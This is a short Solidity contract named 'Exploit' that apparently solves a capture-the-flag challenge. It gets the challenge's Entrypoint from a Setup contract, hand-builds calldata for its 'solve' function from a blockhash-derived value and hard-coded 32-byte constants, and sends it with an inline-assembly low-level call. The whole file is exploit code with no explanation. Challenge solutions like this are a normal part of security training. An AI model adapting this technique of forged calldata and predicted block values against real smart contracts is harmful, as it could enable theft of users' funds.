import "public/Setup.sol";

contract Exploit {
    constructor(Setup setup) public {
        Entrypoint entry = setup.entrypoint();
        
        bytes memory payload = abi.encodePacked(
            entry.solve.selector,
            uint256(uint16(0xff1c) | uint256(bytes32(bytes4(blockhash(block.number - 1))))),
            bytes32(0x370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b),
            bytes32(0xca4c0d1d00a7c0126700ff7ec223814d40a01d242c888ea751a592e2336252da),
            bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca894),
            bytes32(keccak256("choose")),
            bytes32(0x370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b),
            bytes32(uint(4))
        );
        
        assembly {
            switch call(gas(), entry, 0, add(payload, 0x20), 228, 0, 0)
                case 0 {
                    returndatacopy(0x00, 0x00, returndatasize())
                    revert(0x00, returndatasize())
                }
        }
    }
}